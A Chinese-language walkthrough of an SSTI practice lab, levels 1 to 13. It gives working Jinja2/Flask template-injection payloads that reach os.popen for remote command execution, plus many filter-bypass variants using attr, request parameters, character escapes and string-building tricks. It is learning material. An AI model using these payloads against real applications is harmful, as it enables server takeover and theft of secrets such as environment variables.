**原因**

模板引擎（如 Jinja2、Thymeleaf、Twig）用来把变量渲染成 HTML，正常用法是：

```
Hello, {{ username }}
```

如果开发者把用户输入**直接拼接进模板字符串**而不是作为变量传入，比如：

python

```python
template = "Hello, " + user_input  # 危险！
render(template)
```

攻击者输入 `{{ 7*7 }}`，模板引擎就会执行它，返回 `49`，说明存在 SSTI。
这里只学习了python版本的SSTI，主要造成危害的函数是
```python
render_template_string(user_input) # 最常见 
Template(user_input).render() 
environment.from_string(user_input)
```


## level1
这一关没有任何过滤，有很多解题方法。
### 用继承链进入
先
```
code={{''.__class__.__base__.__subclasses__()[]}}
```
这样会返回Python进程中，所有继承自object类的列表。
其中`_frozen_importlib_external.FileLoader`类可以对服务器文件进行读取，当然也会有其他的类可以利用，要rce的话是需要`__import__`一个os模块的。所以可以用burp爆破一下索引值，看哪些可以`__import__('os')`
用
```
code={{''.__class__.__base__.__subclasses__()[i].__init__.__globals__['__builtins__']['__import__']('os')}}
```
![](/image/264.png)
可以看到有很多可以都可以。
```
{{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').popen('env').read()}}
```
### flask上下文变量的url_for
```
{{url_for.__globals__.__builtins__.__import__('os').popen('env').read()}}
或{{url_for.__globals__.os.popen('env').read()}}
```
### 内置对象config进入
```
{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('env').read()}}
```
### 利用lipsum
```
{{lipsum.__globals__.__builtins__.__import__('os').popen('env').read()}}
或{{lipsum.__globals__.os.popen('env').read()}}
```
### 利用get_flashed_messages
```
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('env').read()}}
或者{{get_flashed_messages.__globals__.os.popen('env').read()}}
```
可以这样用是因为`url_for lipsum get_flashed_messages`里有内置的os模块和`__import__`模块
### 利用cycler
```
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
```
## level2
这一关把`{{`给禁止了，但是可以用`{%%}`语法，先试一下
```
{%if 2>1%}666{%endif%}
```
但是这里有一个细节，就是因为`%`有特殊含义(url编码的前缀)，用hackbar直接提交不了，需要用题目给的输入框或者用bp发送请求。![](/image/265.png)
可以回显666，说明可以
```
{%print lipsum.__globals__.os.popen('env').read()%}
```
print是为了把回显打印出来，其中`lipsum.__globals__.os.popen('env').read()`可以用第一关用的payload替换。
## level3
这一关是无回显ssti，不多说了,之前整理过，参考文章[Xin's blog - 摆烂日常记录](http://xn--vqqq8jxym.store/blog.html#/blind-ssti-jinjia2)每个方法都试了一下，写文件到static，注入内存马，污染404界面，时间盲注，布尔盲注，都可以，但是题目环境不出网，反弹shell和curl外带是不行了。
## level4
这一关过滤了`[]`
### 不用`[]`
用第一关说的`url_for config lipsum get_flashed_messages`根本就用不上`[]`
### 绕过`[]`
但是要用继承链的方法，也可以绕过`[]`
#### 用`__getitem__`替代
Python 中列表中括号访问指定下标元素实际上是调用了列表的 `__getitem__()` 方法，字典也实现了这个魔术方法
```
{{''.__class__.__base__.__subclasses__().__getitem__(80).__init__.__globals__.__import__('os').popen('env').read()}}
```
用`.__getitem__(80)`代替`[80]`
#### 用pop替代
```
{{''.__class__.__base__.__subclasses__().pop(80).__init__.__globals__.__import__('os').popen('ls').read()}}
```
用`.pop(80)`替代`[80]`
## level5
waf了单引号双引号，可以用request，全局变量request存储了当前http请求的所有信息。可以用request添加get或post请求参数。
例如
```
{{[].__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.__import__('os').popen('env').read()}}
```
把所有需要引号的位置替换掉。
```
{{[].__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.__import__(request.args.a1).popen(request.args.a2).read()}}
```
再`?a1=os&a2=env`
或者如果不想法get请求，也可以用cookie,
```
{{[].__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.__import__(request.cookies.a1).popen(request.cookies.a2).read()}}
```
再在Cookie处填`a1=os;a2=ls`这里Cookie就只可以用`;`分割了，不可以用`&`。
## level6
过滤了`_`，有几种方法,
attr(obj, name) 是一个 Jinja2 的内置函数，用于从对象 obj 中动态访问属性或方法，属性名通过 name 提供，之所以要用`attr()`函数，是因为下面用的字符串拼接的方法拼接出的还是字符串，需要用`attr()`函数动态访问属性，他才有实际意义。
### 用十六进制编码
例如
```
{{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').popen('env').read()}}
```
可以写成
```
{{((''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')())[80]|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f'))['\x5f\x5fimport\x5f\x5f']('os').popen('env').read()}}
```
中括号访问元素时前面一大串要加括号，不然出问题，这里不知道为什么，必须用`['__import__']`不可以用`.__import__`的形式了，按理说都一样的。
### 八进制编码
```
{{((''|attr('\137\137class\137\137')|attr('\137\137base\137\137')|attr('\137\137subclasses\137\137')())[80]|attr('\137\137init\137\137')|attr('\137\137globals\137\137'))['\137\137import\137\137']('os').popen('env').read()}}
```
### 用request
因为过滤只针对post发送的内容，不针对get
```
{{((''|attr(request.args.a1)|attr(request.args.a2)|attr(request.args.a3)())[80]|attr(request.args.a4)|attr(request.args.a5))[request.args.a6]('os').popen('ls').read()}}
```
再传get参数`?a1=__class__&a2=__base__&a3=__subclasses__&a4=__init__&a5=__globals__&a6=__import__`
### 用unicode编码
```
{{((''|attr('\u005f\u005fclass\u005f\u005f')|attr('\u005f\u005fbase\u005f\u005f')|attr('\u005f\u005fsubclasses\u005f\u005f')())[80]|attr('\u005f\u005finit\u005f\u005f')|attr('\u005f\u005fglobals\u005f\u005f'))['\u005f\u005fimport\u005f\u005f']('os').popen('ls').read()}}
```
## level7
过滤了`.`
依然可以用attr绕过
```
{{((''|attr('__class__')|attr('__base__')|attr('__subclasses__')())[80]|attr('__init__')|attr('__globals__'))['__import__']('os')|attr('popen')('env')|attr('read')()}}
```
## level8
过滤了
```
["class", "arg", "form", "value", "data", "request", "init", "global", "open", "mro", "base", "attr"]
```
### reverse字符反转
```
{%set a="__ssalc__"|reverse%}{{()[a]}}
```
### replace字符替换
```
{%set a="__claee__"|replace('ee','ss')%}{{''[a]}}
```
### join拼接
```
{%set a=dict(__cla=a,ss__=a)|join%}{{()[a]}}
```
也可以
```
{%set a=['__cla','ss__']|join%}{{''[a]}}
```

### 字符拼接
```
{{''['__cla'+'ss__']['__ba'+'se__']['__subcla'+'sses__']()[80]['__in'+'it__']['__glo'+'bals__']['__im'+'port__']('os')['po'+'pen']('env')['re'+'ad']()}}
```
也可以这样拼接
```
{%set a="__cla"%}{%set b="ss__"%}{{''[a~b]}}
```
### 十六进制替换
把某个字符替换为十六进制就可以了
```
{{''['__cl\x61ss__']['__b\x61se__']['__subcl\x61sses__']()[80]['__i\x6eit__']['__glob\x61ls__']['__import__']('os')['pope\x6e']('env').read()}}
```
## level9
过滤了数字，可以直接用第一关里说的不用数字的方法，上下文变量或内置对象。
但是如果硬要用数字的话，也有办法。
用length过滤器可以取到数字
```
{%set a="aaaaaaaa"|length*"aaaaaaaaaa"|length%}{{a}}
```
回显80，
```
{%set a="aaaaaaaa"|length*"aaaaaaaaaa"|length%}{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['__builtins__']['__import__']('os').popen('env').read()}}
```
可以执行。
## leval10
这一关要读config
直接`{{config}}`是读不出任何东西的。
这关是要查看到 config，它是 Flask app 对象的一个属性，而 app 实例可以在 flask app 的上下文中通过 `current_app` 访问
`['current_app']`在他的一个全局作用域
```
{{url_for.__globals__['current_app'].config}}
或{{get_flashed_messages.__globals__['current_app'].config}}
```
但是`{{lipsum.__globals__['current_app'].config}}`不行。
## level11
过滤了`' " + request . []`
这就是综合过滤了
用attr和dict绕过
原理就是`dict(__class__=a)`dict会创建一个字典`{"__class__":a}`，join是Jinja2过滤器，对字典使用join，默认遍历键。
```
code={%set a=dict(__class__=a)|join%}
{%set b=dict(__base__=a)|join%}
{%set c=dict(__subclasses__=a)|join%}
{%set d=dict(__getitem__=a)|join%}
{%set e=dict(__init__=a)|join%}
{%set f=dict(__globals__=a)|join%}
{%set g=dict(__import__=a)|join%}
{%set h=dict(os=a)|join%}
{%set i=dict(popen=a)|join%}
{%set j=dict(env=a)|join%}
{%set k=dict(read=a)|join%}
{{()|attr(a)|attr(b)|attr(c)()|attr(d)(80)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)(j)|attr(k)()}}
```
但是发现一个问题，pop貌似只可以取数字索引值，`__getitem__`既可以取数字，又可以直接取值，我用pop取值环境直接爆了，不知道为什么。
还可以用list和first
例如
```
{{lipsum|attr(dict(__globals__=a)|list|first)}}
```
原理是`dict(__globals__)`把他变成一个字典`{"__globals__":a}`再`|list`变成列表`["__globals__"]`再`|first`取第一个值，也就是`__globals__`
所以payload
```
{{lipsum|attr(dict(__globals__=a)|list|first)|attr(dict(__getitem__=a)|list|first)(dict(os=a)|list|first)|attr(dict(popen=a)|list|first)(dict(env=a)|list|first)|attr(dict(read=a)|list|first)()}}
```
## level12
黑名单`['_', '.', '0-9', '\\', '\'', '"', '[', ']']`
这一关如果不用数字的话，可以直接http传参。
```
{{lipsum|attr(request|attr(dict(args=lipsum)|list|first)|attr(dict(get=lipsum)|list|first)(dict(g=lipsum)|list|first))|attr(request|attr(dict(args=lipsum)|list|first)|attr(dict(get=lipsum)|list|first)(dict(i=lipsum)|list|first))(request|attr(dict(args=lipsum)|list|first)|attr(dict(get=lipsum)|list|first)(dict(o=lipsum)|list|first))|attr(request|attr(dict(args=lipsum)|list|first)|attr(dict(get=lipsum)|list|first)(dict(p=lipsum)|list|first))(request|attr(dict(args=lipsum)|list|first)|attr(dict(get=lipsum)|list|first)(dict(c=lipsum)|list|first))|attr(request|attr(dict(args=lipsum)|list|first)|attr(dict(get=lipsum)|list|first)(dict(r=lipsum)|list|first))()}}
```
同步访问
```
?g=__globals__&i=__getitem__&o=os&p=popen&c=env&r=read
```
但是如果要用数字的话，可以用count，
```
{%set num=dict(aaaaaaaa=a)|join|count*dict(aaaaaaaaaa=a)|join|count%}{{num}}
```
下划线可以从别的地方搬过来，
```
{%set a=(lipsum|string|list)|list%}{{a}}
```
可以输出
```
['<', 'f', 'u', 'n', 'c', 't', 'i', 'o', 'n', ' ', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'e', '_', 'l', 'o', 'r', 'e', 'm', '_', 'i', 'p', 's', 'u', 'm', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', 'a', '8', '0', '1', 'c', 'b', 'b', 'b', '8', '0', '>']
```
其中第10个是空格，第19个是下划线。

最终payload
```
{%set a=(lipsum|string|list)|list%}
{%set num=dict(aaaaaaaa=a)|join|count*dict(aaaaaaaaaa=a)|join|count%}
{%set eighteen=dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}
{%set p=dict(pop=a)|join%}
{%set x=lipsum|string|list|attr(p)(eighteen)%}
{%set class=(x,x,dict(class=a)|join,x,x)|join%}
{%set base=(x,x,dict(base=a)|join,x,x)|join%}
{%set sub=(x,x,dict(subclasses=a)|join,x,x)|join%}
{%set init=(x,x,dict(init=a)|join,x,x)|join%}
{%set globals=(x,x,dict(globals=a)|join,x,x)|join%}
{%set getitem=(x,x,dict(getitem=a)|join,x,x)|join%}
{%set import=(x,x,dict(import=a)|join,x,x)|join%}
{%set os=dict(os=a)|join%}
{%set popen=dict(popen=a)|join%}
{%set env=dict(env=a)|join%}
{%set read=dict(read=a)|join%}
{{()|attr(class)|attr(base)|attr(sub)()|attr(p)(num)|attr(init)|attr(globals)|attr(getitem)(import)(os)|attr(popen)(env)|attr(read)()}}
```
如果要执行`ls /`中间有空格，可以取空格，`/`也可以取。
## level13
黑名单
```
['_', '.', '\\', '\'', '"', 'request', '+', 'class', 'init', 'arg', 'config', 'app', 'self', '[', ']']
```
这一关就是在上一关基础上多禁了几个关键字。
拆开就行了。这一关没有过滤数字。
```
{%set a=(lipsum|string|list)|list%}
{%set p=dict(pop=a)|join%}
{%set x=lipsum|string|list|attr(p)(18)%}
{%set cla=(x,x,dict(cla=a)|join,dict(ss=a)|join,x,x)|join%}
{%set base=(x,x,dict(base=a)|join,x,x)|join%}
{%set sub=(x,x,dict(subcla=a)|join,dict(sses=a)|join,x,x)|join%}
{%set in=(x,x,dict(in=a)|join,dict(it=a)|join,x,x)|join%}
{%set globals=(x,x,dict(globals=a)|join,x,x)|join%}
{%set getitem=(x,x,dict(getitem=a)|join,x,x)|join%}
{%set import=(x,x,dict(import=a)|join,x,x)|join%}
{%set os=dict(os=a)|join%}
{%set popen=dict(popen=a)|join%}
{%set env=dict(env=a)|join%}
{%set read=dict(read=a)|join%}
{{()|attr(cla)|attr(base)|attr(sub)()|attr(p)(80)|attr(in)|attr(globals)|attr(getitem)(import)(os)|attr(popen)(env)|attr(read)()}}
```
要注意的是，因为`class`被过滤了，因为`subclasses`里有个`class`，所以也得拆开。
## 参考文章
- http://8.137.103.176:5000/post/5
- https://www.kkayu.com/archive/2
- http://shaogx.cn/posts/ssti-labs/#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3